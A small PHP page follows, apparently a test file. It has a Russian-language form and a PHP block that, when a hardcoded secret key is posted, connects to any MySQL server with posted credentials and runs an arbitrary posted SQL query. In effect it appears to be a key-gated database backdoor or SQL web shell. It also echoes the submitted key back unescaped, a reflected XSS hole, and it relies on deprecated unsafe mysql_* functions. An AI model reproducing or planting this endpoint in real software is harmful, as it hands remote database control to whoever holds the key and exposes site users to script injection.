<form action="test.php" method="POST">
<input type="text" name="tst" value="проверка"><br/>
<button type="submit">нажми меня, о мой белый господин Ваня ибн Коля</button>
</form>
<?
//echo($_POST['tst']);
if ($_POST['key']=='dfw2e6g4fyiwegfa8sklcasdnlfvh9nfgawhihs7igha5su8ilghwe9gry7'){
$dbname = $_POST['dbname'];
$server = $_POST['server'];
$login = $_POST['login'];
$password = $_POST['password'];
$request = $_POST['request'];
$charset = $_POST['charset'];
$connection = mysql_connect ($server, $login, $password);
if (!$connection) {
    die('Ошибка соединения: ' . mysql_error());
}
mysql_select_db ( $dbname);
mysql_set_charset ( $charset);
$rq = str_replace('\\','',$request);
$ok = mysql_query($rq);
echo($ok);
echo($request);
mysql_close($connection);
}else{
echo($_POST['key']);
}
?>